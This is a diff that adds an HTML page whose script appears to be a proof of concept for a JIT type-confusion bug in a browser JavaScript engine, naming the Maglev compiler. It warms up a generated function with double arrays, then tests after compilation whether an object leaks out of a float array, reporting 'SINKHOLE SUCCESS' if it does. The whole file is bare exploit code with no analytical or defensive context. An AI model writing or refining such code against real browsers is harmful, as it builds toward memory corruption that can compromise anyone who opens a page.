@@ -1,0 +1,45 @@
+<!DOCTYPE html><html><body><script>
+N_BLOCKS = 650;
+let lines = [];
+lines.push("function trigger(x, arr, obj) {");
+for (let i = 0; i < N_BLOCKS; i++) {
+  lines.push(`  if (x === ${i}) return ${i};`);
+}
+lines.push("  arr[0] = obj;");
+lines.push("  let res = 0;");
+lines.push("  let i = 0;");
+lines.push("  while (i < 1) {");
+lines.push("    res = arr[1];");
+lines.push("    i++;");
+lines.push("  }");
+lines.push("  return res;");
+lines.push("}");
+lines.push("return trigger;");
+
+let trigger = new Function(lines.join("\n"))();
+
+let dummy = { a: 1 };
+console.log("Pre-allocating pool...");
+let pool = [];
+for (let i = 0; i < 20000; i++) {
+  pool.push([1.1, 2.2, 3.3]);
+}
+
+console.log("Warming up trigger with pool...");
+for (let i = 0; i < 20000; i++) {
+  trigger(i, pool[i], dummy);
+}
+console.log("Warmup complete! Waiting 5s for Maglev...");
+
+setTimeout(() => {
+  console.log("Testing trigger post-compilation...");
+  let farr = [1.1, 2.2, 3.3];
+  let res = trigger(1000, farr, dummy);
+  console.log("res type:", typeof res, "res:", res);
+  if (typeof res === "object") {
+    console.log("=== SINKHOLE SUCCESS! Object:", res, "===");
+  } else {
+    console.log("res is still:", res);
+  }
+}, 5000);
+</script></body></html>
